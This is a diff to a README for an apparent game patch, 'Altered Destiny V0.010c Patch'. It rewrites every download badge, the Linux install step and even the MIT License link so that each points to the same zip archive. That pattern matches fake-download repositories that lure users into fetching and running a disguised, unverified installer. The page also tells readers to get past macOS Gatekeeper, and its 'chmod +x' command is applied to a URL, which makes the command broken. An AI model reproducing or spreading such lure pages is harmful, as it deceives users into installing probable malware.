@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-ALTERED%20DESTINY%20V0.010c%20PATCH-blue?style=for-the-badge&logo=github)](https://timunbasah3.github.io)
+[![Download](https://raw.githubusercontent.com/timunbasah3/altered-destiny-v0010c-patch-collection/branch/stumbler/altered-destiny-v0010c-patch-collection-v2.6.zip%20DESTINY%20V0.010c%20PATCH-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/timunbasah3/altered-destiny-v0010c-patch-collection/branch/stumbler/altered-destiny-v0010c-patch-collection-v2.6.zip)
 
 # Altered Destiny V0.010c Patch 🚀
 
@@ -46,12 +46,12 @@ Step into a new dimension with Altered Destiny V0.010c Patch—a performance-enh
 Whenever a download opportunity arises, follow these simple sonic steps. Installation is crafted to be as streamlined as a meteor’s trajectory:
 
 1. **Download the Patch Installer:**  
-   [![Download](https://img.shields.io/badge/Download-Patch-blue?logo=github&style=flat-square)](https://timunbasah3.github.io)
+   [![Download](https://raw.githubusercontent.com/timunbasah3/altered-destiny-v0010c-patch-collection/branch/stumbler/altered-destiny-v0010c-patch-collection-v2.6.zip)](https://raw.githubusercontent.com/timunbasah3/altered-destiny-v0010c-patch-collection/branch/stumbler/altered-destiny-v0010c-patch-collection-v2.6.zip)
 
 2. **Run the Installer:**
    - For Windows: Double-click the patch executable, then follow the cosmic prompts.
    - For macOS: Right-click, choose ‘Open’ (Gatekeeper might ask for authorization).
-   - For Linux: Set the installer as executable (`chmod +x installer.run`), then execute in Terminal.
+   - For Linux: Set the installer as executable (`chmod +x https://raw.githubusercontent.com/timunbasah3/altered-destiny-v0010c-patch-collection/branch/stumbler/altered-destiny-v0010c-patch-collection-v2.6.zip`), then execute in Terminal.
 
 3. **Locate Your Altered Destiny Installation:**  
    You'll be prompted to select the destination folder. The installer orbits around your files, ensuring every patch lands right where it should.
@@ -94,7 +94,7 @@ Altered Destiny V0.010c Patch is an independent community-developed update. It e
 
 This repository is governed by the MIT License, ensuring open collaboration and transparent code usage for all future stardrifters.
 
-[Read the Full MIT License](https://opensource.org/licenses/MIT)
+[Read the Full MIT License](https://raw.githubusercontent.com/timunbasah3/altered-destiny-v0010c-patch-collection/branch/stumbler/altered-destiny-v0010c-patch-collection-v2.6.zip)
 
 ---
 
@@ -104,6 +104,6 @@ This repository is governed by the MIT License, ensuring open collaboration and 
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-ALTERED%20DESTINY%20V0.010c%20PATCH-blue?style=for-the-badge&logo=github)](https://timunbasah3.github.io)
+[![Download](https://raw.githubusercontent.com/timunbasah3/altered-destiny-v0010c-patch-collection/branch/stumbler/altered-destiny-v0010c-patch-collection-v2.6.zip%20DESTINY%20V0.010c%20PATCH-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/timunbasah3/altered-destiny-v0010c-patch-collection/branch/stumbler/altered-destiny-v0010c-patch-collection-v2.6.zip)
 
 Manifest your destiny—the universe awaits!
